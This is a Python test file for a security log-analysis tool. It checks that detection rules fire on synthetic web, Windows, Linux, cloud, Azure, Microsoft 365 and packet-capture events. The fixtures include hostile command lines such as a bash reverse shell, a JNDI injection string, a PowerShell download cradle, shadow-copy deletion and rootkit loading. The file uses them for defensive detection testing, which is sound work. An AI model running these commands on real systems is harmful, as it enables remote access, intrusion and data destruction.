"""The wider built-in catalogue: every new rule fires on the thing it describes, and only on that.

A rule that ships but never fires is worse than no rule — it reads as coverage. So each of these builds
the minimum event that should trip one rule and asserts that rule (not merely SOME rule) tagged it, plus
a negative pool that must stay clean. The point is not to re-test the engine; it is to pin that the
field names, event ids and regexes in the catalogue match what the PARSERS actually produce.
"""
from __future__ import annotations

import numpy as np
import pytest

from app.detect import RULES, run_rules
from app.models import Event


def _ev(i: int, source: str, msg: str, fields: dict, ts: str = "2026-05-01T14:00:00Z", raw: str = "") -> Event:
    return Event(id=f"e{i:x}", ts=ts, source=source, sourceId="s1", file="evidence.log",
                 host=fields.get("host", ""), user=fields.get("user", ""), msg=msg, sev="info",
                 raw=raw or msg, fields=fields)


def _run(events: list[Event]) -> dict[str, list[Event]]:
    """rule id -> the events it tagged."""
    ts = np.asarray([1777989600.0 + i for i in range(len(events))], dtype="float64")
    run_rules(events, ts)
    out: dict[str, list[Event]] = {}
    for e in events:
        for d in e.detections:
            out.setdefault(d.id, []).append(e)
    return out


def _fires(rid: str, events: list[Event]) -> list[Event]:
    hits = _run(events)
    assert rid in hits, f"{rid} did not fire on the evidence it exists for; got {sorted(hits)}"
    return hits[rid]


# --------------------------------------------------------------------- web
def test_webshell_and_jndi_and_long_paths() -> None:
    ev = [_ev(1, "nginx.access", "GET /uploads/shell.php", {"http.path": "/uploads/shell.php", "src_ip": "10.0.0.9"}),
          _ev(2, "nginx.access", "GET /?x=${jndi:ldap://evil/a}",
              {"http.path": "/?x=${jndi:ldap://evil/a}", "src_ip": "10.0.0.9"}),
          _ev(3, "nginx.access", "GET /long", {"http.path": "/a" + "B" * 1200, "src_ip": "10.0.0.9"})]
    hits = _run(ev)
    assert "SIGMA-WEB-0075" in hits and "SIGMA-WEB-0079" in hits and "SIGMA-WEB-0084" in hits


def test_a_normal_web_request_trips_nothing() -> None:
    ev = [_ev(i, "nginx.access", "GET /api/v2/products",
              {"http.path": "/api/v2/products", "http.status": "200", "src_ip": "198.51.100.4",
               "user_agent": "Mozilla/5.0 Chrome/126.0"})
          for i in range(40)]
    assert _run(ev) == {}, "ordinary traffic must not trip a rule"


def test_a_403_burst_is_forced_browsing() -> None:
    ev = [_ev(i, "nginx.access", "GET /admin", {"http.path": f"/admin/{i}", "http.status": "403",
                                                "src_ip": "198.51.100.44"}) for i in range(40)]
    assert _fires("SIGMA-WEB-0071", ev)


# --------------------------------------------------------------------- Windows
def test_password_spray_is_distinct_accounts_not_volume() -> None:
    """The rule this pins is the reason find_distinct_bursts exists: 12 failures against 12 DIFFERENT
    accounts is a spray, and 12 failures against one account is not."""
    spray = [_ev(i, "windows.evtx", "logon failure",
                 {"EventID": "4625", "IpAddress": "203.0.113.9", "TargetUserName": f"user{i}"})
             for i in range(12)]
    assert _fires("SIGMA-WIN-0170", spray)

    one = [_ev(i, "windows.evtx", "logon failure",
               {"EventID": "4625", "IpAddress": "203.0.113.9", "TargetUserName": "alice"})
           for i in range(12)]
    assert "SIGMA-WIN-0170" not in _run(one), "one account failing repeatedly is a lockout, not a spray"


def test_service_install_task_and_recovery_destruction() -> None:
    ev = [_ev(1, "windows.evtx", "service installed", {"EventID": "7045", "ServiceName": "evil"}),
          _ev(2, "windows.evtx", "task created", {"EventID": "4698", "TaskName": "\\Updater"}),
          _ev(3, "windows.evtx", "process create",
              {"EventID": "4688", "CommandLine": "vssadmin.exe delete shadows /all /quiet"}),
          _ev(4, "windows.evtx", "defender", {"EventID": "1116", "ThreatName": "Trojan:Win32/Test"})]
    hits = _run(ev)
    for rid in ("SIGMA-WIN-0175", "SIGMA-WIN-0180", "SIGMA-WIN-0185", "SIGMA-WIN-0160"):
        assert rid in hits, rid
    # That same 4688 also trips WIN-0133 (vssadmin is attacker tooling), which is correct and is why the
    # Windows branch uses independent `if`s rather than an elif chain. Read the detection by ID, not by
    # position, or this asserts against whichever rule happened to run first.
    e = hits["SIGMA-WIN-0185"][0]
    assert next(d for d in e.detections if d.id == "SIGMA-WIN-0185").level == "critical"
    assert {d.id for d in e.detections} >= {"SIGMA-WIN-0133", "SIGMA-WIN-0185"}


# --------------------------------------------------------------------- Linux
def test_reverse_shell_suid_and_kernel_module() -> None:
    ev = [_ev(1, "syslog", "cmd", {"program": "bash"}, raw="bash -i >& /dev/tcp/10.0.0.9/4444 0>&1"),
          _ev(2, "syslog", "cmd", {"program": "audit"}, raw="chmod u+s /usr/bin/find"),
          _ev(3, "syslog", "cmd", {"program": "kernel"}, raw="insmod /tmp/rootkit.ko"),
          _ev(4, "syslog", "cron", {"program": "cron"}, raw="wrote /etc/cron.d/backdoor")]
    hits = _run(ev)
    for rid in ("SIGMA-LNX-0060", "SIGMA-LNX-0070", "SIGMA-LNX-0075", "SIGMA-LNX-0065"):
        assert rid in hits, rid


# --------------------------------------------------------------------- cloud
def test_public_bucket_shared_image_and_disabled_security_service() -> None:
    ev = [_ev(1, "aws.cloudtrail", "PutBucketAcl", {"eventName": "PutBucketAcl", "user": "dev"},
              raw='{"eventName":"PutBucketAcl","grantee":"http://acs.amazonaws.com/groups/global/AllUsers"}'),
          _ev(2, "aws.cloudtrail", "ModifySnapshotAttribute",
              {"eventName": "ModifySnapshotAttribute", "user": "dev"},
              raw='{"eventName":"ModifySnapshotAttribute","attributeType":"createVolumePermission","add":{"group":"all"}}'),
          _ev(3, "aws.cloudtrail", "DeleteDetector", {"eventName": "DeleteDetector", "user": "dev"})]
    hits = _run(ev)
    for rid in ("SIGMA-AWS-0080", "SIGMA-AWS-0090", "SIGMA-AWS-0095"):
        assert rid in hits, rid


def test_kubernetes_cluster_admin_and_anonymous() -> None:
    ev = [_ev(1, "k8s.audit", "create binding",
              {"resource": "clusterrolebindings", "verb": "create", "user": "dev"},
              raw='{"roleRef":{"name":"cluster-admin"}}'),
          _ev(2, "k8s.audit", "get pods", {"resource": "pods", "verb": "list", "user": "system:anonymous"})]
    hits = _run(ev)
    assert "SIGMA-K8S-0030" in hits and "SIGMA-K8S-0035" in hits


# --------------------------------------------------------------------- packet captures
def test_capture_rules_read_the_fields_the_pcap_parser_produces() -> None:
    """These field names are the contract between app/parsers/pcap.py and the catalogue."""
    tunnel = "a" * 48 + ".exfil.example.com"
    ev = [_ev(1, "network.pcap", f"DNS query {tunnel}",
              {"dns_query": tunnel, "dns_qr": "query", "src_ip": "10.0.0.5", "protocol": "UDP"}),
          _ev(2, "network.pcap", "TLS client hello c2.duckdns.org",
              {"tls_sni": "c2.duckdns.org", "dst_port": "443", "protocol": "TCP", "src_ip": "10.0.0.5"}),
          _ev(3, "network.pcap", "TCP 10.0.0.5:52344 > 10.0.0.9:23",
              {"dst_port": "23", "protocol": "TCP", "payload_len": "40", "src_ip": "10.0.0.5"}),
          _ev(4, "network.pcap", "TLS client hello on 8081",
              {"tls_sni": "cdn.example.net", "dst_port": "8081", "protocol": "TCP", "src_ip": "10.0.0.5"})]
    hits = _run(ev)
    for rid in ("SIGMA-PCAP-0010", "SIGMA-PCAP-0022", "SIGMA-PCAP-0018", "SIGMA-PCAP-0030"):
        assert rid in hits, rid


def test_a_syn_scan_counts_distinct_ports() -> None:
    ev = [_ev(i, "network.pcap", "syn", {"tcp_flags": "SYN", "src_ip": "203.0.113.9",
                                         "dst_port": str(1000 + i), "protocol": "TCP"})
          for i in range(60)]
    hit = _fires("SIGMA-PCAP-0026", ev)
    assert "different ports" in hit[0].msg


def test_ordinary_https_traffic_is_not_flagged() -> None:
    ev = [_ev(i, "network.pcap", "TLS client hello www.example.com",
              {"tls_sni": "www.example.com", "dst_port": "443", "protocol": "TCP", "src_ip": "10.0.0.5",
               "tcp_flags": "PSH,ACK"})
          for i in range(50)]
    assert _run(ev) == {}


# --------------------------------------------------------------------- any source
def test_secrets_encoded_commands_and_ransomware_are_found_in_any_source() -> None:
    ev = [_ev(1, "app.jsonl", "config loaded", {}, raw='{"aws_key":"AKIAIOSFODNN7EXAMPLE"}'),
          _ev(2, "delimited", "cmd", {}, raw="powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA"),
          _ev(3, "text", "file", {}, raw="C:\\Users\\bob\\Desktop\\HOW_TO_DECRYPT.txt")]
    hits = _run(ev)
    for rid in ("SIGMA-APP-0070", "SIGMA-APP-0075", "SIGMA-APP-0080"):
        assert rid in hits, rid


def _secret_fires(raw: str) -> bool:
    return "SIGMA-APP-0070" in _run([_ev(1, "delimited", "line", {}, raw=raw)])


def test_a_public_api_key_in_a_proxied_url_is_not_a_leaked_secret() -> None:
    """The reported false positive, verbatim shape: a Sophos web-proxy row of a browser fetching MSN news
    with the public front-end key every such request carries. 776 hits for zero credentials."""
    proxy = ('"Aug 23, 2026 @ 20:43:24.915","Content Filtering","10.0.0.100","150.171.27.12",443,"api.msn.com","-",'
             '"https://api.msn.com/v1/news/Feed/Windows?msnup=7dE5WGLOEk7iOuyA2jG5CQ%3d%3d'
             '&apikey=qrUeHGGYvVowZJuHA3XaH0uUvg1ZJ0GUZnXk3mxxPF&activityId=d7e49831-285b-43a5-9494-450fc412f76a"')
    assert not _secret_fires(proxy)
    telemetry = ('"https://browser.events.data.msn.com/OneCollector/1.0?cors=true&client-id=NO_AUTH'
                 '&client-version=1DS-Web-JS-3.2.8&apikey=0ded60c75e44443aa3fcb7a4ec6a8d3a-abcdef"')
    assert not _secret_fires(telemetry)


def test_a_credential_in_a_url_still_fires() -> None:
    assert _secret_fires('GET https://intranet.corp/login?user=alice&password=Hunter22Winter! HTTP/1.1')
    assert _secret_fires('https://api.example.com/v2/export?token=8f3a9c1d2e4b5a6f7c8d9e0f1a2b3c4d')
    # a line with a public apikey AND a real password: the real one wins
    assert _secret_fires('https://api.msn.com/x?apikey=qrUeHGGYvVowZJuHA3XaH0uUvg1ZJ0GUZnXk3mxxPF&password=Hunter22Winter!')


def test_placeholders_masks_templates_and_working_directories_do_not_fire() -> None:
    for raw in ('db.password=${DB_PASSWORD}', 'api_key: {{ vault.api_key }}', 'password=********',
                'token=xxxxxxxxxxxxxxxx', 'client_secret=<redacted>', 'secret: [FILTERED]',
                'pwd=/home/alice/projects/iris', 'PWD=C:\\Users\\alice\\Desktop', 'password=%s'):
        assert not _secret_fires(raw), raw


def test_real_secrets_in_any_shape_fire() -> None:
    # The vendor-shaped tokens are ASSEMBLED here rather than written out: GitHub's push protection
    # scans the repository text for exactly these formats and refuses the push. Nothing here is real.
    gh_pat = "github_" + "pat_" + "11ABCDEFG0123456789abcdefghijklmnop"
    gh_app = "gh" + "s_" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    stripe = "sk_" + "live_" + "4eC39HqLyjWDarjtT1zdp7dc"
    slack = "https://hooks.slack.com/" + "services/" + "T0000000000/B0000000000/" + "X" * 24
    for raw in ('password=Hunter22Winter!', 'api_key: qrUeHGGYvVowZJuHA3XaH0uUvg1ZJ0GUZnXk3mxxPF',
                f'export GITHUB_TOKEN={gh_pat}', f'STRIPE={stripe}', gh_app, f'curl -X POST {slack}',
                '{"aws_key":"AKIAIOSFODNN7EXAMPLE"}', '-----BEGIN RSA PRIVATE KEY-----'):
        assert _secret_fires(raw), raw


def test_the_any_source_pass_is_skipped_when_those_rules_are_off() -> None:
    """A disabled rule must not cost a scan of the evidence — the pass is the one that touches every
    event, so 'it does nothing' is not good enough."""
    ev = [_ev(1, "app.jsonl", "config", {}, raw='{"aws_key":"AKIAIOSFODNN7EXAMPLE"}')]
    ts = np.asarray([1.0])
    run_rules(ev, ts, disabled={"SIGMA-APP-0070", "SIGMA-APP-0075", "SIGMA-APP-0080"})
    assert not ev[0].detections


# --------------------------------------------------------------------- shape of the catalogue
def test_every_rule_id_is_unique_and_prefixed() -> None:
    ids = [r.id for r in RULES]
    assert len(ids) == len(set(ids))
    assert all(i.startswith("SIGMA-") for i in ids)


@pytest.mark.parametrize("family", ["WEB", "AUTH", "WIN", "LNX", "AWS", "K8S", "MAIL", "PCAP", "APP", "NET"])
def test_each_family_is_represented(family: str) -> None:
    assert any(r.id.startswith(f"SIGMA-{family}-") for r in RULES), f"no {family} rules in the catalogue"


# --------------------------------------------------------------------- Windows (third tranche)
def test_credential_access_and_lateral_movement_events() -> None:
    ev = [_ev(1, "windows.evtx", "explicit creds", {"EventID": "4648", "SubjectUserName": "alice"}),
          _ev(2, "windows.evtx", "lockout", {"EventID": "4740", "TargetUserName": "bob"}),
          _ev(3, "windows.evtx", "registry",
              {"EventID": "4657", "ObjectName": r"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential"}),
          _ev(4, "windows.evtx", "script block",
              {"EventID": "4104", "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"}),
          # a REAL public address: 198.51.100.x and 203.0.113.x are documentation ranges, which
          # ipaddress (and therefore normalize.is_public_ip) correctly reports as not global
          _ev(5, "windows.evtx", "rdp", {"EventID": "4624", "LogonType": "10", "IpAddress": "45.33.32.156",
                                         "TargetUserName": "admin"}),
          _ev(6, "windows.evtx", "share", {"EventID": "5140", "ShareName": r"\*\ADMIN$"}),
          _ev(7, "windows.evtx", "handle", {"EventID": "4656", "ObjectName": r"C:\Windows\System32\lsass.exe"}),
          _ev(8, "windows.evtx", "log cleared", {"EventID": "104", "Channel": "System"}),
          _ev(9, "windows.evtx", "fw rule", {"EventID": "4946", "RuleName": "allow 4444"})]
    hits = _run(ev)
    for rid in ("SIGMA-WIN-0200", "SIGMA-WIN-0205", "SIGMA-WIN-0215", "SIGMA-WIN-0220", "SIGMA-WIN-0225",
                "SIGMA-WIN-0250", "SIGMA-WIN-0255", "SIGMA-WIN-0235", "SIGMA-WIN-0230"):
        assert rid in hits, rid


# --------------------------------------------------------------------- Azure / Entra ID
def _azure(i: int, fields: dict) -> Event:
    return _ev(i, "app.jsonl", "azure sign-in", fields)


def test_azure_signin_rules_read_the_fields_the_export_carries() -> None:
    ev = [_azure(1, {"userPrincipalName": "alice@corp.com", "resultType": "0",
                     "riskLevelDuringSignIn": "high", "clientAppUsed": "Browser"}),
          _azure(2, {"userPrincipalName": "bob@corp.com", "resultType": "0", "clientAppUsed": "IMAP4"}),
          _azure(3, {"userPrincipalName": "bob@corp.com", "resultType": "500121"}),
          _azure(4, {"userPrincipalName": "carol@corp.com", "resultType": "53003",
                     "conditionalAccessStatus": "failure"})]
    hits = _run(ev)
    for rid in ("SIGMA-AZURE-0010", "SIGMA-AZURE-0014", "SIGMA-AZURE-0018", "SIGMA-AZURE-0022"):
        assert rid in hits, rid


def test_azure_audit_rules_read_operation_names() -> None:
    ev = [_azure(1, {"operationName": "Consent to application", "initiatedBy.user.userPrincipalName": "alice@corp.com"}),
          _ev(2, "app.jsonl", "role", {"operationName": "Add member to role"},
              raw='{"operationName":"Add member to role","targetResources":[{"displayName":"Global Administrator"}]}'),
          _azure(3, {"operationName": "Add service principal credentials"}),
          _azure(4, {"operationName": "Delete conditional access policy"})]
    hits = _run(ev)
    for rid in ("SIGMA-AZURE-0030", "SIGMA-AZURE-0034", "SIGMA-AZURE-0038", "SIGMA-AZURE-0046"):
        assert rid in hits, rid


def test_azure_signin_failure_burst_and_multiple_countries() -> None:
    fails = [_azure(i, {"userPrincipalName": "dave@corp.com", "resultType": "50126"}) for i in range(15)]
    assert _fires("SIGMA-AZURE-0026", fails)

    trips = [_azure(i, {"userPrincipalName": "erin@corp.com", "resultType": "0",
                        "location.countryOrRegion": "GB" if i % 2 else "RU"})
             for i in range(6)]
    hit = _fires("SIGMA-AZURE-0042", trips)
    assert "different countries" in hit[0].msg


# --------------------------------------------------------------------- Microsoft 365 / Defender
def test_microsoft_365_audit_rules() -> None:
    ev = [_ev(1, "app.jsonl", "rule", {"Operation": "New-InboxRule", "UserId": "alice@corp.com"}),
          _ev(2, "app.jsonl", "fwd", {"Operation": "Set-Mailbox", "UserId": "alice@corp.com"},
              raw='{"Operation":"Set-Mailbox","Parameters":[{"Name":"ForwardingSmtpAddress","Value":"x@evil.io"}]}'),
          _ev(3, "app.jsonl", "search", {"Operation": "SearchExported", "UserId": "bob@corp.com"}),
          _ev(4, "app.jsonl", "share", {"Operation": "AnonymousLinkCreated", "UserId": "bob@corp.com"}),
          _ev(5, "app.jsonl", "audit off", {"Operation": "Set-AdminAuditLogConfig", "UserId": "eve@corp.com"}),
          _ev(6, "app.jsonl", "alert", {"AlertId": "da123", "Severity": "High", "Title": "Suspicious inbox rule"}),
          _ev(7, "app.jsonl", "phish", {"ThreatType": "Phish", "DeliveryAction": "Blocked"})]
    hits = _run(ev)
    for rid in ("SIGMA-M365-0014", "SIGMA-M365-0018", "SIGMA-M365-0022", "SIGMA-M365-0026",
                "SIGMA-M365-0038", "SIGMA-M365-0010", "SIGMA-M365-0034"):
        assert rid in hits, rid


def test_bulk_download_burst() -> None:
    ev = [_ev(i, "app.jsonl", "download", {"Operation": "FileDownloaded", "UserId": "mallory@corp.com"})
          for i in range(150)]
    assert _fires("SIGMA-M365-0030", ev)


# --------------------------------------------------------------------- one account, many addresses
def test_an_account_used_from_many_addresses_is_flagged_across_families() -> None:
    """The analyst asked for this one by name. It reads Windows, syslog, web and cloud sign-ins together
    because a credential in two pairs of hands rarely shows up in a single log."""
    ev = ([_ev(i, "windows.evtx", "logon", {"EventID": "4624", "TargetUserName": "alice",
                                            "IpAddress": f"198.51.100.{i}"}) for i in range(3)]
          + [_azure(10 + i, {"userPrincipalName": "alice", "resultType": "0",
                             "callerIpAddress": f"203.0.113.{20 + i}"}) for i in range(3)])
    hit = _fires("SIGMA-AUTH-0240", ev)
    assert "different addresses" in hit[0].msg


def test_one_account_from_one_address_is_not_flagged() -> None:
    ev = [_ev(i, "windows.evtx", "logon", {"EventID": "4624", "TargetUserName": "alice",
                                           "IpAddress": "10.0.0.5"}) for i in range(30)]
    assert "SIGMA-AUTH-0240" not in _run(ev)


def test_machine_accounts_do_not_drive_the_multi_address_rule() -> None:
    """A computer account authenticates constantly and would dominate every per-account count."""
    ev = [_ev(i, "windows.evtx", "logon", {"EventID": "4624", "TargetUserName": "WS01$",
                                           "IpAddress": f"10.0.0.{i}"}) for i in range(20)]
    assert "SIGMA-AUTH-0240" not in _run(ev)


def test_an_unstamped_signin_does_not_kill_the_whole_pass() -> None:
    """An event with no parseable timestamp must not stop the catalogue from running.

    `_iso_to_epoch("")` returns `float('inf')` on purpose — an unstamped event sorts last and matches
    no window (store.py:3713). But `inf` walks straight past the `t <= 0` guard in `_outside_hours`,
    and `int((inf // 3600) % 24)` is `int(nan)`, which raises ValueError out of `run_rules`. One EVTX
    4624 or one successful ConsoleLogin whose timestamp did not parse therefore took the WHOLE pass
    with it — and `_refresh_detections_async` has a catch-all, so the workspace would simply stop
    being scanned with nothing on screen to say so. The synthetic `ts` arrays every other test in this
    file builds are always finite, which is why it survived here.
    """
    ev = [_ev(1, "windows.evtx", "An account was successfully logged on",
              {"EventID": "4624", "LogonType": "10", "user": "svc_backup", "host": "WIN-FS01"}, ts=""),
          _ev(2, "aws.cloudtrail", "ConsoleLogin",
              {"eventName": "ConsoleLogin", "result": "success", "user": "root"}, ts="")]
    ts = np.asarray([float("inf")] * len(ev), dtype="float64")
    run_rules(ev, ts)          # must not raise
    assert not any(d.id == "SIGMA-AUTH-0230" for e in ev for d in e.detections), \
        "an event with no timestamp cannot be judged inside or outside business hours"


def test_a_rule_that_stops_firing_gives_the_event_its_severity_back() -> None:
    """`sev` is stored, not derived, so a detection raising it has to be reversible.

    `_tag` did `ev.sev = max_sev(ev.sev, lvl)` and nothing ever put it back, so disabling a rule — or
    tightening one until it no longer matches — left its events reading `critical` for ever: in
    search, in `sev:` filters, on the timeline and in the anomaly roll-up. Nothing on screen said the
    severity came from a rule that is no longer in force.
    """
    ev = [_ev(1, "nginx.access", "GET /uploads/shell.php",
              {"http.path": "/uploads/shell.php", "src_ip": "10.0.0.9"})]
    base = ev[0].sev
    ts = np.asarray([1777989600.0], dtype="float64")

    run_rules(ev, ts)
    fired = {d.id for d in ev[0].detections}
    assert fired, "the fixture fired nothing, so it cannot test an escalation"
    assert ev[0].sev != base, "the fixture's rules do not raise severity"

    run_rules(ev, ts, disabled=fired)
    assert not ev[0].detections
    assert ev[0].sev == base, f"severity stayed at {ev[0].sev!r} after the rules were disabled"


def test_the_base_survives_several_rules_and_partial_removal() -> None:
    """The base is what the event was with NO detection at all — not what it was before the second
    one. Removing one of two escalating rules must fall back to the other, not to the base."""
    from app.models import Detection

    e = _ev(1, "nginx.access", "x", {"http.path": "/x"})
    assert e.sev == "info"
    e.add_detection(Detection(name="a", id="A", level="medium"))
    e.raise_sev("medium")
    e.add_detection(Detection(name="b", id="B", level="critical"))
    e.raise_sev("critical")
    assert e.sev == "critical"

    e.detections = [d for d in e.detections if d.id != "B"]      # the critical one stops firing
    e.recompute_sev()
    assert e.sev == "medium", "fell past the rule that is still firing"

    e.detections = []
    e.recompute_sev()
    assert e.sev == "info" and e._base_sev is None
